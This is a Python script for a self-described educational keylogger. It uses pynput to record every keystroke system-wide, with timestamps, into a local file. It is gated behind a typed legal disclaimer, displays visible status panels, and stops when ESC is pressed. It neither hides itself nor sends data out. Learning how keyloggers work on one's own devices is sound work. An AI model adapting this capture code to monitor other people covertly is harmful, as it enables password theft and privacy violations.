"""Educational Keylogger - For security research and education only"""

import os
from datetime import datetime
from pynput import keyboard
from rich.console import Console
from rich.panel import Panel

console = Console()


class EducationalKeylogger:
    """Educational keylogger for learning purposes - ETHICAL USE ONLY"""
    
    def __init__(self):
        self.name = "Educational Keylogger"
        self.log_file = "keylog.txt"
        self.listener = None
        self.is_running = False
    
    def show_disclaimer(self):
        """Display ethical use disclaimer and get user agreement
        
        Returns:
            bool: True if user agrees, False otherwise
        """
        disclaimer_text = (
            "[bold red]⚠️  EDUCATIONAL USE ONLY - ETHICAL DISCLAIMER ⚠️[/bold red]\n\n"
            "[yellow]This keylogger is designed for:[/yellow]\n"
            "  • Educational purposes to understand how keyloggers work\n"
            "  • Testing on YOUR OWN devices only\n"
            "  • Security research in controlled environments\n\n"
            "[bold red]ILLEGAL AND UNETHICAL USES:[/bold red]\n"
            "  ✗ Installing on someone else's computer without consent\n"
            "  ✗ Monitoring others without authorization\n"
            "  ✗ Stealing passwords or personal information\n"
            "  ✗ Any use that violates privacy laws\n\n"
            "[bold yellow]LEGAL NOTICE:[/bold yellow]\n"
            "Unauthorized use of keyloggers may violate federal and state\n"
            "laws including the Computer Fraud and Abuse Act (CFAA),\n"
            "Electronic Communications Privacy Act (ECPA), and state\n"
            "wiretapping laws. Penalties can include fines and imprisonment.\n\n"
            "[bold green]By continuing, you affirm that:[/bold green]\n"
            "  ✓ You will only use this on devices you own\n"
            "  ✓ You understand the legal and ethical implications\n"
            "  ✓ You accept full responsibility for your actions\n"
        )
        
        console.print("\n")
        console.print(Panel(
            disclaimer_text,
            title="[bold red]ETHICAL USE AGREEMENT[/bold red]",
            border_style="red",
            padding=(1, 2)
        ))
        
        console.print("\n[bold yellow]Type 'I AGREE' (all caps) to proceed, or anything else to cancel:[/bold yellow]")
        response = console.input("[bold red]> [/bold red]").strip()
        
        return response == "I AGREE"
    
    def log_keystroke(self, key):
        """Log a keystroke to file with timestamp
        
        Args:
            key: The key that was pressed
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Format the key for logging
            try:
                key_str = key.char
            except AttributeError:
                # Special keys (Enter, Space, etc.)
                key_str = f"[{key}]"
            
            # Write to log file
            with open(self.log_file, 'a') as f:
                f.write(f"{timestamp} - {key_str}\n")
        except Exception as e:
            console.print(f"[red]Error logging key: {e}[/red]")
    
    def on_press(self, key):
        """Callback for key press events
        
        Args:
            key: The key that was pressed
            
        Returns:
            False to stop listener if Esc is pressed, True otherwise
        """
        try:
            # Log the keystroke
            self.log_keystroke(key)
            
            # Check for Esc key to stop
            if key == keyboard.Key.esc:
                console.print("\n[yellow]Esc key detected - stopping keylogger...[/yellow]")
                return False  # Stop listener
            
            return True  # Continue listening
        except Exception as e:
            console.print(f"[red]Error in key handler: {e}[/red]")
            return True
    
    def start_logging(self):
        """Start the keylogger"""
        try:
            console.print("\n")
            console.print(Panel(
                "[green]Keylogger is now running![/green]\n\n"
                f"Logging to: [cyan]{os.path.abspath(self.log_file)}[/cyan]\n\n"
                "[yellow]Instructions:[/yellow]\n"
                "  • All keystrokes will be logged to the file\n"
                "  • Press [bold red]ESC[/bold red] to stop and return to menu\n"
                "  • Switch to another window to test (optional)\n\n"
                "[dim]Note: This window will continue displaying your keystrokes.[/dim]",
                title="[bold green]Keylogger Active[/bold green]",
                border_style="green"
            ))
            
            # Initialize log file with header
            with open(self.log_file, 'a') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Keylogger Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n")
            
            console.print("\n[bold cyan]Listening for keystrokes... (Press ESC to stop)[/bold cyan]\n")
            
            # Start the listener
            with keyboard.Listener(on_press=self.on_press) as listener:
                self.listener = listener
                self.is_running = True
                listener.join()  # Block until stopped
            
            # Log session end
            with open(self.log_file, 'a') as f:
                f.write(f"{'='*60}\n")
                f.write(f"Session Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
            
            console.print("\n")
            console.print(Panel(
                f"[green]✓ Keylogger stopped successfully![/green]\n\n"
                f"Log file: [cyan]{os.path.abspath(self.log_file)}[/cyan]\n"
                f"Size: {os.path.getsize(self.log_file):,} bytes",
                title="[bold green]Session Complete[/bold green]",
                border_style="green"
            ))
        except KeyboardInterrupt:
            console.print("\n[yellow]Keylogger interrupted by user.[/yellow]")
            with open(self.log_file, 'a') as f:
                f.write(f"Session Interrupted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        except Exception as e:
            console.print(f"[red]Error during keylogging: {e}[/red]")
    
    def run(self):
        """Execute the keylogger"""
        try:
            console.print("\n[bold cyan]Educational Keylogger[/bold cyan]")
            console.print("\n[white]Learn how keyloggers work - ETHICAL USE ONLY[/white]")
            
            # Show disclaimer and get agreement
            if not self.show_disclaimer():
                console.print("\n[yellow]Agreement not accepted. Returning to menu.[/yellow]")
                input("\nPress Enter to return to menu...")
                return
            
            console.print("\n[green]Agreement accepted. Preparing keylogger...[/green]")
            
            # Start logging
            self.start_logging()
            
            input("\nPress Enter to return to menu...")
        except KeyboardInterrupt:
            console.print("\n[yellow]Operation cancelled.[/yellow]")
            input("\nPress Enter to return to menu...")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            input("\nPress Enter to return to menu...")
